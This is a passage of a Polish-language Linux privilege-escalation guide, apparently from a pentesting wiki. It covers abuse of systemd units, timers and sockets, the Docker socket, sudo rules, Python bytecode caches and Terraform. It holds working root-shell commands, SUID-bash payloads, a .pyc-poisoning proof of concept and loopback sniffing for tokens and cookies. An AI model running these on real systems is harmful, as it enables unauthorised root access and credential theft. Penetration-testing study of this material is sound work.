```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Następnie utwórz **wykonywalny** plik o **tej samej nazwie co binarka ze ścieżki względnej** wewnątrz zapisywalnego przez Ciebie folderu systemd PATH. Gdy usługa otrzyma polecenie wykonania podatnej akcji (**Start**, **Stop**, **Reload**), zostanie wykonany Twój **backdoor** (nieuprzywilejowani użytkownicy zwykle nie mogą uruchamiać ani zatrzymywać usług, ale sprawdź, czy możesz użyć `sudo -l`).

**Więcej informacji o usługach znajdziesz w `man systemd.service`.**

## **Timery**

**Timery** to pliki jednostek systemd, których nazwa kończy się na `**.timer**` i które kontrolują pliki `**.service**` lub zdarzenia. **Timery** mogą być używane jako alternatywa dla crona, ponieważ mają wbudowaną obsługę zdarzeń czasowych kalendarza i monotonicznych zdarzeń czasowych oraz mogą być uruchamiane asynchronicznie.

Wszystkie timery możesz wyświetlić za pomocą:
```bash
systemctl list-timers --all
```
### Timery z możliwością zapisu

Jeśli możesz modyfikować timer, możesz sprawić, aby wykonywał niektóre istniejące elementy systemd.unit (takie jak `.service` lub `.target`).
```bash
Unit=backdoor.service
```
W dokumentacji można przeczytać, czym jest Unit:

> Unit aktywowany po upływie tego timera. Argumentem jest nazwa unitu bez sufiksu „.timer”. Jeśli nie zostanie określony, domyślnie jest to service o tej samej nazwie co unit timera, z wyjątkiem sufiksu. (Zobacz powyżej). Zaleca się, aby nazwa aktywowanego unitu i nazwa unitu timera były identyczne, z wyjątkiem sufiksu.

Dlatego, aby nadużyć tych uprawnień, należy:

- Znaleźć jakiś systemd unit (np. `.service`), który **wykonuje zapisywalny plik binarny**
- Znaleźć jakiś systemd unit, który **wykonuje ścieżkę względną**, oraz posiadać **uprawnienia zapisu do systemd PATH** (aby podszyć się pod ten plik wykonywalny)

**Dowiedz się więcej o timerach za pomocą `man systemd.timer`.**

### **Włączanie timera**

Aby włączyć timer, potrzebujesz uprawnień root i musisz wykonać:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Zwróć uwagę, że **timer** jest **aktywowany** przez utworzenie dowiązania symbolicznego do niego w `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) umożliwiają **komunikację między procesami** na tej samej lub różnych maszynach w ramach modeli klient-serwer. Wykorzystują standardowe pliki deskryptorów Unix do komunikacji między komputerami i są konfigurowane za pomocą plików `.socket`.

Sockets można konfigurować za pomocą plików `.socket`.

**Dowiedz się więcej o sockets za pomocą `man systemd.socket`.** W tym pliku można skonfigurować kilka interesujących parametrów:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Te opcje różnią się od siebie, ale ich podsumowanie służy do **wskazania, gdzie socket będzie nasłuchiwać** (ścieżka pliku socketu AF_UNIX, numer IPv4/6 i/lub portu, na którym ma nasłuchiwać itd.)
- `Accept`: Przyjmuje argument logiczny. Jeśli ma wartość **true**, dla **każdego przychodzącego połączenia uruchamiana jest instancja usługi**, do której przekazywany jest tylko socket połączenia. Jeśli ma wartość **false**, wszystkie sockety nasłuchujące są **przekazywane do uruchamianej jednostki usługi**, a dla wszystkich połączeń uruchamiana jest tylko jedna jednostka usługi. Ta wartość jest ignorowana dla socketów datagramowych i FIFO, gdzie jedna jednostka usługi bezwarunkowo obsługuje cały przychodzący ruch. **Domyślnie jest ustawiona na false**. Ze względów wydajności zaleca się pisanie nowych daemonów wyłącznie w sposób odpowiedni dla `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Przyjmują jeden lub więcej wierszy poleceń, które są **wykonywane przed** lub **po** odpowiednim **utworzeniu** i powiązaniu nasłuchujących **socketów**/FIFO. Pierwszy token wiersza poleceń musi być nazwą bezwzględną pliku, po której następują argumenty procesu.
- `ExecStopPre`, `ExecStopPost`: Dodatkowe **polecenia**, które są **wykonywane przed** lub **po** odpowiednim **zamknięciu** i usunięciu nasłuchujących **socketów**/FIFO.
- `Service`: Określa nazwę jednostki **usługi**, którą należy **aktywować** po **przychodzącym ruchu**. To ustawienie jest dozwolone tylko dla socketów z `Accept=no`. Domyślnie jest to usługa o takiej samej nazwie jak socket (z zamienionym rozszerzeniem). W większości przypadków użycie tej opcji nie powinno być konieczne.

### Zapisywalne pliki .socket

Jeśli znajdziesz **zapisywalny** plik `.socket`, możesz **dodać** na początku sekcji `[Socket]` coś takiego: `ExecStartPre=/home/kali/sys/backdoor`, a backdoor zostanie wykonany przed utworzeniem socketu. W związku z tym **prawdopodobnie trzeba będzie zaczekać na ponowne uruchomienie maszyny.**\
_Należy pamiętać, że system musi korzystać z konfiguracji tego pliku socketu, w przeciwnym razie backdoor nie zostanie wykonany_

### Socket activation + writable unit path (create missing service)

Inną konfiguracją o dużym wpływie jest:

- jednostka socketu z `Accept=no` i `Service=<name>.service`
- brakuje wskazanej jednostki usługi
- attacker może zapisywać do `/etc/systemd/system` (lub innej ścieżki wyszukiwania jednostek)

W takim przypadku attacker może utworzyć `<name>.service`, a następnie wywołać ruch do socketu, aby systemd załadował i uruchomił nową usługę jako root.

Szybki przebieg:
```bash
systemctl cat vuln.socket
# [Socket]
# Accept=no
# Service=vuln.service
```

```bash
cat >/etc/systemd/system/vuln.service <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash'
EOF
nc -q0 127.0.0.1 9999
/var/tmp/rootbash -p
```
### Zapisywalne sockets

Jeśli **zidentyfikujesz dowolny zapisywalny socket** (_teraz mówimy o Unix Sockets, a nie o plikach konfiguracyjnych `.socket`_), możesz **komunikować się** z tym socketem i być może wykorzystać vulnerability.

### Enumerate Unix Sockets
```bash
netstat -a -p --unix
```
### Surowe połączenie
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Przykład wykorzystania:**


{{#ref}}
../../network-information/socket-command-injection.md
{{#endref}}

### Gniazda HTTP

Należy pamiętać, że mogą istnieć **gniazda nasłuchujące żądań HTTP** (_nie mam na myśli plików .socket, lecz pliki działające jako gniazda unixowe_). Możesz to sprawdzić za pomocą:
```bash
curl --max-time 2 --unix-socket /path/to/socket/file http://localhost/
```
Jeśli socket **odpowiada żądaniem HTTP**, możesz się z nim **komunikować** i być może **wykorzystać pewną podatność**.

### Zapisywalny socket Dockera

Socket Dockera, często znajdujący się w `/var/run/docker.sock`, to krytyczny plik, który powinien być odpowiednio zabezpieczony. Domyślnie jest zapisywalny przez użytkownika `root` oraz członków grupy `docker`. Posiadanie dostępu do zapisu w tym sockecie może prowadzić do eskalacji uprawnień. Poniżej przedstawiono, jak można to zrobić, oraz alternatywne metody na wypadek, gdyby Docker CLI nie był dostępny.

#### **Eskalacja uprawnień za pomocą Docker CLI**

Jeśli masz dostęp do zapisu w sockecie Dockera, możesz eskalować uprawnienia za pomocą następujących poleceń:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Te polecenia umożliwiają uruchomienie kontenera z dostępem na poziomie roota do systemu plików hosta.

#### **Bezpośrednie używanie Docker API**

Jeśli Docker CLI nie jest dostępne, nadal można nadużyć socketu Dockera, używając nieprzetworzonego HTTP przez socket Unix. Najbardziej niezawodny przebieg wygląda następująco:

- utwórz długotrwały kontener pomocniczy z zamontowanym katalogiem głównym hosta
- uruchom go
- utwórz instancję `exec` wewnątrz tego kontenera pomocniczego
- uruchom instancję `exec` i odczytaj wynik z powrotem przez API

**Wyświetlanie obrazów Docker**
```bash
curl --unix-socket /var/run/docker.sock http://localhost/images/json
```
**Utwórz i uruchom kontener pomocniczy**
```bash
HELPER=helper

curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"alpine:3.20","Cmd":["sleep","99999"],"HostConfig":{"Binds":["/:/host"]}}' \
"http://localhost/v1.47/containers/create?name=${HELPER}"

curl --unix-socket /var/run/docker.sock \
-X POST "http://localhost/v1.47/containers/${HELPER}/start"
```
**Utwórz instancję exec**
```bash
EXEC_ID=$(
curl -s --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"AttachStdout":true,"AttachStderr":true,"Tty":true,"Cmd":["sh","-lc","find /host/root -maxdepth 1 -type f"]}' \
"http://localhost/v1.47/containers/${HELPER}/exec" \
| tr -d '\n' \
| sed -n 's/.*"Id":"\([^"]*\)".*/\1/p'
)
```
**Uruchom instancję exec i odczytaj dane wyjściowe**
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Detach":false,"Tty":true}' \
"http://localhost/v1.47/exec/${EXEC_ID}/start"
```
Ten schemat jest zwykle bardziej niezawodny niż próba ręcznego sterowania `attach` za pomocą `socat` lub `nc -U`. Gdy możesz już utworzyć helpera z `/:/host`, możesz użyć dodatkowych instancji `exec` do odczytywania plików takich jak `/host/root/...`, dodawania kluczy SSH w `/host/root/.ssh` lub modyfikowania plików startowych hosta.

### Inne

Pamiętaj, że jeśli masz uprawnienia zapisu do socketu Dockera, ponieważ **jesteś wewnątrz grupy `docker`**, masz [**więcej sposobów na eskalację uprawnień**](../../user-information/interesting-groups-linux-pe/index.html#docker-group). Jeśli [**API Dockera nasłuchuje na porcie**], możesz również być w stanie je przejąć](../../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Sprawdź **więcej sposobów na wydostanie się z kontenerów lub wykorzystanie runtime'ów kontenerów do eskalacji uprawnień** tutaj:


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Eskalacja uprawnień w Containerd (ctr)

Jeśli znajdziesz sposób na użycie polecenia **`ctr`**, przeczytaj następującą stronę, ponieważ **możesz być w stanie wykorzystać je do eskalacji uprawnień**:


{{#ref}}
../../containers-namespaces/containerd-ctr-privilege-escalation.md
{{#endref}}

## Eskalacja uprawnień w **RunC**

Jeśli znajdziesz sposób na użycie polecenia **`runc`**, przeczytaj następującą stronę, ponieważ **możesz być w stanie wykorzystać je do eskalacji uprawnień**:


{{#ref}}
../../containers-namespaces/runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus to zaawansowany **system komunikacji międzyprocesowej (IPC)**, który umożliwia aplikacjom wydajną interakcję i współdzielenie danych. Zaprojektowany z myślą o nowoczesnym systemie Linux, oferuje solidne środowisko dla różnych form komunikacji między aplikacjami.

System jest wszechstronny i obsługuje podstawowe IPC, które usprawnia wymianę danych między procesami, przypominając **rozszerzone sockety domeny UNIX**. Ponadto umożliwia rozgłaszanie zdarzeń lub sygnałów, wspierając płynną integrację między komponentami systemu. Na przykład sygnał demona Bluetooth o połączeniu przychodzącym może spowodować wyciszenie odtwarzacza muzyki, poprawiając komfort użytkownika. D-Bus obsługuje również system obiektów zdalnych, upraszczając żądania usług i wywołania metod między aplikacjami oraz usprawniając procesy, które tradycyjnie były złożone.

D-Bus działa w oparciu o **model allow/deny**, zarządzając uprawnieniami wiadomości (wywołaniami metod, emisją sygnałów itp.) na podstawie skumulowanego efektu pasujących reguł polityk. Polityki te określają interakcje z magistralą i potencjalnie umożliwiają eskalację uprawnień poprzez wykorzystanie tych uprawnień.

Przykład takiej polityki znajduje się w `/etc/dbus-1/system.d/wpa_supplicant.conf` i określa uprawnienia użytkownika root do posiadania, wysyłania oraz odbierania wiadomości od `fi.w1.wpa_supplicant1`.

Polityki bez określonego użytkownika lub grupy mają zastosowanie uniwersalne, natomiast polityki w kontekście „default” dotyczą wszystkich przypadków, których nie obejmują inne konkretne polityki.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Dowiedz się tutaj, jak przeprowadzać enumerację i wykorzystywać komunikację D-Bus:**


{{#ref}}
../../processes-crontab-systemd-dbus/d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Sieć**

Zawsze warto przeprowadzić enumerację sieci i ustalić pozycję maszyny.

### Ogólna enumeracja
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#NSS resolution order (hosts file vs DNS)
grep -E '^(hosts|networks):' /etc/nsswitch.conf
getent hosts localhost

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)
(ip -br addr || ip addr show)

#Routes and policy routing (pivot paths)
ip route
ip -6 route
ip rule
ip route get 1.1.1.1

#L2 neighbours
(arp -e || arp -a || ip neigh)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#L2 topology (VLANs/bridges/bonds)
ip -d link
bridge link 2>/dev/null

#Network namespaces (hidden interfaces/routes in containers)
ip netns list 2>/dev/null
ls /var/run/netns/ 2>/dev/null
nsenter --net=/proc/1/ns/net ip a 2>/dev/null

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#nftables and firewall wrappers (modern hosts)
sudo nft list ruleset 2>/dev/null
sudo nft list ruleset -a 2>/dev/null
sudo ufw status verbose 2>/dev/null
sudo firewall-cmd --state 2>/dev/null
sudo firewall-cmd --list-all 2>/dev/null

#Forwarding / asymmetric routing / conntrack state
sysctl net.ipv4.ip_forward net.ipv6.conf.all.forwarding net.ipv4.conf.all.rp_filter 2>/dev/null
sudo conntrack -L 2>/dev/null | head -n 20

#Files used by network services
lsof -i
```
### Szybka diagnostyka filtrowania ruchu wychodzącego

Jeśli host może wykonywać polecenia, ale callbacks zawodzą, szybko rozdziel filtrowanie DNS, transportu, proxy i trasowania:
```bash
# DNS over UDP and TCP (TCP fallback often survives UDP/53 filters)
dig +time=2 +tries=1 @1.1.1.1 google.com A
dig +tcp +time=2 +tries=1 @1.1.1.1 google.com A

# Common outbound ports
for p in 22 25 53 80 443 587 8080 8443; do nc -vz -w3 example.org "$p"; done

# Route/path clue for 443 filtering
sudo traceroute -T -p 443 example.org 2>/dev/null || true

# Proxy-enforced environments and remote-DNS SOCKS testing
env | grep -iE '^(http|https|ftp|all)_proxy|no_proxy'
curl --socks5-hostname <ip>:1080 https://ifconfig.me
```
### Otwarte porty

Zawsze sprawdzaj usługi sieciowe działające na maszynie, z którymi nie udało Ci się wcześniej nawiązać interakcji, przed uzyskaniem do niej dostępu:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
ss -tulpn
#Quick view of local bind addresses (great for hidden/isolated interfaces)
ss -tulpn | awk '{print $5}' | sort -u
```
Klasyfikuj listeners według bind target:

- `0.0.0.0` / `[::]`: dostępne na wszystkich lokalnych interfejsach.
- `127.0.0.1` / `::1`: dostępne tylko lokalnie (dobrzy kandydaci do tunnel/forward).
- Konkretne wewnętrzne adresy IP (np. `10.x`, `172.16/12`, `192.168.x`, `fe80::`): zwykle dostępne tylko z segmentów wewnętrznych.

### Workflow triage usług dostępnych tylko lokalnie

Po przejęciu hosta usługi zbindowane do `127.0.0.1` często po raz pierwszy stają się dostępne z Twojego shell. Szybki lokalny workflow wygląda następująco:
```bash
# 1) Find local listeners
ss -tulnp

# 2) Discover open localhost TCP ports
nmap -Pn --open -p- 127.0.0.1

# 3) Fingerprint only discovered ports
nmap -Pn -sV -p <ports> 127.0.0.1

# 4) Manually interact / banner grab
nc 127.0.0.1 <port>
printf 'HELP\r\n' | nc 127.0.0.1 <port>
```
### LinPEAS jako skaner sieciowy (tryb tylko sieciowy)

Oprócz lokalnych kontroli PE linPEAS może działać jako ukierunkowany skaner sieciowy. Wykorzystuje dostępne pliki binarne z `$PATH` (zwykle `fping`, `ping`, `nc`, `ncat`) i nie instaluje żadnych narzędzi.
```bash
# Auto-discover subnets + hosts + quick ports
./linpeas.sh -t

# Host discovery in CIDR
./linpeas.sh -d 10.10.10.0/24

# Host discovery + custom ports
./linpeas.sh -d 10.10.10.0/24 -p 22,80,443

# Scan one IP (default/common ports)
./linpeas.sh -i 10.10.10.20

# Scan one IP with selected ports
./linpeas.sh -i 10.10.10.20 -p 21,22,80,443
```
Jeśli przekażesz `-d`, `-p` lub `-i` bez `-t`, linPEAS będzie działać jako czysty skaner sieciowy (pomijając pozostałe kontrole privilege-escalation).

### Sniffing

Sprawdź, czy możesz sniffować ruch. Jeśli tak, możesz być w stanie przechwycić niektóre dane uwierzytelniające.
```
timeout 1 tcpdump
```
Szybkie praktyczne testy:
```bash
#Can I capture without full sudo?
which dumpcap && getcap "$(which dumpcap)"

#Find capture interfaces
tcpdump -D
ip -br addr
```
Loopback (`lo`) jest szczególnie cenny podczas post-exploitation, ponieważ wiele usług dostępnych wyłącznie wewnętrznie ujawnia tam tokeny/cookies/poświadczenia:
```bash
sudo tcpdump -i lo -s 0 -A -n 'tcp port 80 or 8000 or 8080' \
| egrep -i 'authorization:|cookie:|set-cookie:|x-api-key|bearer|token|csrf'
```
Przechwyć teraz, przeanalizuj później:
```bash
sudo tcpdump -i any -s 0 -n -w /tmp/capture.pcap
tshark -r /tmp/capture.pcap -Y http.request \
-T fields -e frame.time -e ip.src -e http.host -e http.request.uri
```
## Użytkownicy

### Generic Enumeration

Sprawdź, **kim** jesteś, jakie masz **uprawnienia**, jacy **użytkownicy** znajdują się w systemie, którzy mogą się **logować**, a którzy mają **uprawnienia root:**
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
who
w
#Only usernames
users
#Login history
last | tail
#Last log of each user
lastlog2 2>/dev/null || lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Duży UID

Niektóre wersje Linux były podatne na błąd, który pozwala użytkownikom z **UID > INT_MAX** na eskalację uprawnień. Więcej informacji: [tutaj](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [tutaj](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) i [tutaj](https://twitter.com/paragonsec/status/1071152249529884674).\
**Wykorzystaj go** za pomocą: **`systemd-run -t /bin/bash`**

### Grupy

Sprawdź, czy jesteś **członkiem grupy**, która może nadać Ci uprawnienia root:


{{#ref}}
../../user-information/interesting-groups-linux-pe/
{{#endref}}

### Schowek

Sprawdź, czy w schowku znajduje się coś interesującego (jeśli to możliwe)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Polityka haseł
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Znane hasła

Jeśli **znasz dowolne hasło** w środowisku, **spróbuj zalogować się jako każdy użytkownik**, używając tego hasła.

### Su Brute

Jeśli nie przeszkadza Ci generowanie dużej ilości szumu, a pliki binarne `su` i `timeout` są obecne na komputerze, możesz spróbować przeprowadzić brute-force użytkownika za pomocą [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) z parametrem `-a` również próbuje przeprowadzić brute-force użytkowników.

## Nadużycia zapisywalnego PATH

### $PATH

Jeśli stwierdzisz, że możesz **zapisywać w którymś folderze ze zmiennej $PATH**, możesz być w stanie eskalować uprawnienia, **tworząc backdoor w zapisywalnym folderze** pod nazwą polecenia, które ma zostać wykonane przez innego użytkownika (najlepiej root) i które **nie jest ładowane z folderu znajdującego się wcześniej** niż Twój zapisywalny folder w $PATH.

### SUDO i SUID

Możesz mieć możliwość wykonania niektórych poleceń za pomocą sudo lub mogą one mieć ustawiony bit suid. Sprawdź to za pomocą:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Niektóre **nieoczekiwane polecenia pozwalają odczytywać i/lub zapisywać pliki, a nawet wykonywać polecenia.** Na przykład:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Konfiguracja Sudo może umożliwiać użytkownikowi wykonanie niektórych poleceń z uprawnieniami innego użytkownika bez znajomości hasła.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
W tym przykładzie użytkownik `demo` może uruchomić `vim` jako `root`; uzyskanie shell jest teraz trywialne poprzez dodanie klucza ssh do katalogu root lub wywołanie `sh`.
```
sudo vim -c '!sh'
```
### SETENV

Ta dyrektywa umożliwia użytkownikowi **ustawienie zmiennej środowiskowej** podczas wykonywania czegoś:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Ten przykład, **oparty na maszynie HTB Admirer**, był **podatny** na **PYTHONPATH hijacking**, co umożliwiało załadowanie dowolnej biblioteki Pythona podczas wykonywania skryptu jako root:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### Zatruwanie zapisywalnego `__pycache__` / `.pyc` w importach Python dozwolonych przez sudo

Jeśli **skrypt Python dozwolony przez sudo** importuje moduł, którego katalog pakietu zawiera **zapisywalny `__pycache__`**, możesz być w stanie zastąpić zapisany w cache plik `.pyc` i uzyskać code execution jako uprzywilejowany użytkownik przy następnym imporcie.

- Dlaczego to działa:
- CPython przechowuje cache bytecode'u w `__pycache__/module.cpython-<ver>.pyc`.
- Interpreter weryfikuje **nagłówek** (magic + metadane timestamp/hash powiązane ze źródłem), a następnie wykonuje obiekt code zapisany za tym nagłówkiem.
- Jeśli możesz **usunąć i ponownie utworzyć** zapisany w cache plik, ponieważ katalog jest zapisywalny, plik `.pyc` należący do roota, ale niezapisywalny, nadal może zostać zastąpiony.
- Typowa ścieżka:
- `sudo -l` pokazuje skrypt Python lub wrapper, który możesz uruchomić jako root.
- Ten skrypt importuje lokalny moduł z `/opt/app/`, `/usr/local/lib/...` itd.
- Katalog `__pycache__` importowanego modułu jest zapisywalny przez Twojego użytkownika lub przez wszystkich.

Szybka enumeracja:
```bash
sudo -l
find / -type d -name __pycache__ -writable 2>/dev/null
find / -type f -path '*/__pycache__/*.pyc' -ls 2>/dev/null
```
Jeśli możesz przeanalizować uprzywilejowany skrypt, zidentyfikuj importowane moduły i ich ścieżkę pamięci podręcznej:
```bash
grep -R "^import \\|^from " /opt/target/ 2>/dev/null
python3 - <<'PY'
import importlib.util
spec = importlib.util.find_spec("target_module")
print(spec.origin)
print(spec.cached)
PY
```
Schemat wykorzystania:

1. Uruchom raz skrypt dozwolony przez sudo, aby Python utworzył poprawny plik cache, jeśli jeszcze nie istnieje.
2. Odczytaj pierwsze 16 bajtów z poprawnego pliku `.pyc` i użyj ich w zatrutym pliku.
3. Skompiluj obiekt kodu payloadu, wykonaj na nim `marshal.dumps(...)`, usuń oryginalny plik cache i utwórz go ponownie, używając oryginalnego nagłówka oraz złośliwego bytecode.
4. Ponownie uruchom skrypt dozwolony przez sudo, aby import wykonał payload jako root.

Ważne uwagi:

- Ponowne użycie oryginalnego nagłówka ma kluczowe znaczenie, ponieważ Python sprawdza metadane cache względem pliku źródłowego, a nie to, czy treść bytecode rzeczywiście odpowiada plikowi źródłowemu.
- Jest to szczególnie przydatne, gdy plik źródłowy należy do root i nie można go zapisywać, ale można zapisywać w zawierającym go katalogu `__pycache__`.
- Atak nie powiedzie się, jeśli uprzywilejowany proces używa `PYTHONDONTWRITEBYTECODE=1`, importuje pliki z lokalizacji o bezpiecznych uprawnieniach lub odbierze możliwość zapisu do każdego katalogu na ścieżce importu.

Minimalna forma proof-of-concept:
```python
import marshal, pathlib, subprocess, tempfile

pyc = pathlib.Path("/opt/app/__pycache__/target.cpython-312.pyc")
header = pyc.read_bytes()[:16]
payload = "import os; os.system('cp /bin/bash /tmp/rbash && chmod 4755 /tmp/rbash')"

with tempfile.TemporaryDirectory() as d:
src = pathlib.Path(d) / "x.py"
src.write_text(payload)
code = compile(src.read_text(), str(src), "exec")
pyc.unlink()
pyc.write_bytes(header + marshal.dumps(code))

subprocess.run(["sudo", "/opt/app/runner.py"])
```
Hardening:

- Upewnij się, że żaden katalog w uprzywilejowanej ścieżce importu Python nie jest zapisywalny przez użytkowników o niskich uprawnieniach, w tym `__pycache__`.
- W przypadku uprzywilejowanych uruchomień rozważ użycie `PYTHONDONTWRITEBYTECODE=1` oraz okresowe sprawdzanie, czy nie pojawiły się nieoczekiwane zapisywalne katalogi `__pycache__`.
- Traktuj zapisywalne lokalne moduły Python i zapisywalne katalogi cache w taki sam sposób, jak zapisywalne skrypty shell lub shared libraries wykonywane przez root.

### BASH_ENV preserved via sudo env_keep → root shell

Jeśli sudoers zachowuje `BASH_ENV` (np. `Defaults env_keep+="ENV BASH_ENV"`), możesz wykorzystać zachowanie startowe Bash dla non-interactive shells, aby uruchomić dowolny kod jako root podczas wywoływania dozwolonego polecenia.

- Dlaczego to działa: W przypadku non-interactive shells Bash interpretuje `$BASH_ENV` i source'uje wskazany plik przed uruchomieniem docelowego skryptu. Wiele reguł sudo pozwala na uruchamianie skryptu lub shell wrappera. Jeśli `BASH_ENV` jest zachowywane przez sudo, Twój plik zostanie załadowany z uprawnieniami root.

- Wymagania:
- Reguła sudo, którą możesz uruchomić (dowolny cel wywołujący `/bin/bash` non-interaktywnie lub dowolny skrypt bash).
- `BASH_ENV` obecne w `env_keep` (sprawdź za pomocą `sudo -l`).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Zabezpieczenia:
- Usuń `BASH_ENV` (oraz `ENV`) z `env_keep`, preferuj `env_reset`.
- Unikaj wrapperów powłoki dla poleceń dozwolonych przez sudo; używaj minimalnych plików binarnych.
- Rozważ logowanie I/O sudo oraz alerty w przypadku użycia zachowanych zmiennych środowiskowych.

### Terraform via sudo z zachowanym HOME (!env_reset)

Jeśli sudo pozostawia środowisko bez zmian (`!env_reset`), jednocześnie zezwalając na `terraform apply`, `$HOME` pozostaje katalogiem wywołującego użytkownika. Terraform ładuje wtedy **$HOME/.terraformrc** jako root i respektuje `provider_installation.dev_overrides`.

- Wskaż wymagany provider na zapisywalny katalog i umieść w nim złośliwy plugin nazwany tak jak provider (np. `terraform-provider-examples`):
```hcl
# ~/.terraformrc
provider_installation {
dev_overrides {
"previous.htb/terraform/examples" = "/dev/shm"
}
direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```
Terraform zakończy się niepowodzeniem podczas handshake'u Go pluginu, ale przed zakończeniem wykona payload jako root, pozostawiając powłokę SUID.

### Nadpisywanie TF_VAR + obejście walidacji symlinków

Zmienne Terraform można przekazywać za pomocą zmiennych środowiskowych `TF_VAR_<name>`, które pozostają dostępne, gdy sudo zachowuje środowisko. Słabe mechanizmy walidacji, takie jak `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")`, można obejść za pomocą symlinków:
```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```
Terraform rozwiązuje symlink i kopiuje prawdziwy plik `/root/root.txt` do miejsca docelowego odczytywalnego przez atakującego. Tego samego podejścia można użyć do **zapisu** w uprzywilejowanych ścieżkach, tworząc wcześniej symlinki w miejscu docelowym (np. wskazujące na ścieżkę docelową providera wewnątrz `/etc/cron.d/`).

### requiretty / !requiretty

W niektórych starszych dystrybucjach sudo można skonfigurować z opcją `requiretty`, która wymusza uruchamianie sudo wyłącznie z interaktywnego TTY. Jeśli ustawiono `!requiretty` (lub opcja ta nie występuje), sudo można wykonywać z kontekstów nieinteraktywnych, takich jak reverse shells, zadania cron lub skrypty.
```bash
Defaults !requiretty
```
Nie jest to samoistna luka, ale rozszerza sytuacje, w których można nadużyć reguł sudo bez potrzeby uzyskania pełnego PTY.

### Sudo env_keep+=PATH / insecure secure_path → PATH hijack

Jeśli `sudo -l` pokazuje `env_keep+=PATH` lub `secure_path` zawierający wpisy zapisywalne przez attackera (np. `/home/<user>/bin`), dowolne polecenie względne używane w dozwolonym przez sudo target może zostać przesłonięte.

